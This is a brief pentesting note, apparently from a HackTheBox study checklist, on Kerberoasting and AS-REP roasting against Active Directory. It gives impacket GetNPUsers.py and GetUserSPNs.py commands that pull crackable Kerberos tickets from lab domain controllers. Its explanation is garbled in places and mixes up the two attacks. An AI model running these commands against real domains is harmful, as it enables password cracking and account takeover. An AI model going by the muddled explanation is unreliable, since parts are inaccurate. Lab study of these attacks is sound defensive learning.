When you try to authenticate using Kerberos rather than sending the encrypted ticket, you contact the DC to the service, you will use off-line brute force to crack the password associated with the service.

several times you will need an active account on the domain in orfer to initial Kerbroast, but if the DC is configured with `UserAccountControl setting “Do not require Kerberos preauthentication” enabled or UF_DONT_REQUIRE_PREAUTH set to true` it is possible to request and recieve a ticket to crack wihtout a valid account on the domain.

So you need users hashes and usernames you might get them from 445(rpcinfo)[[Services Checklist]]ny other way, 
then 
use `GetUserSPNs.py` by impacket.

```bash
# Multiple user 
for user in $(cat users); do GetNPUsers.py -no-pass -dc-ip 10.10.10.161 htb/${user} | grep -v Impacket; done

# Single user 
GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/SVC_TGS -save -outputfile GetUserSPNs.out
```